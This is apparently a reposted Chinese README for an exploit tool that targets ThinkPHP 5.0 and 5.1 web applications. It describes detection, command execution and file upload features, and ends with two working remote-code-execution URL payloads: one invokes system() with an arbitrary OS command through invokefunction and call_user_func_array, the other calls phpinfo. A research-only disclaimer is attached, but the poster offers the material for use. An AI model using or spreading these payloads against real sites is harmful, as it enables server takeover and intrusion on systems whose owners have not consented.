# thinkphp_exp-v5.0|这是找的资源，不知道出处，拿着用吧，侵删
thinkphp_exp-v5.0
2018.12.11

说明：（以下内容是原作者所写）

漏洞检测，5.0和5.1都可以检测。

命令执行，文件上传只支持5.0版本tp。5.1和5.0利用大同小异，不打算写。这只是个练手作品，也勉强可以用。



还是老样子，用bat打开，不然看不到日志输出。



url:需要加http，不支持https检测。

命令：命令就是系统命令，各位都懂。

文件名：上传到服务器的文件名。

好多回显没处理，勉强用吧

网站被我不小心重置系统，月底重开。

www.safe6.cn

免责声明：
safe出品的所有程序，仅限用于学习和研究目的；不得将上述内容用于商业或者非法用途，否则，一切后果请用户自负。

5.1 的exp



命令执行:
http://url/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=操作系统命令


代码执行:
http://url/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1


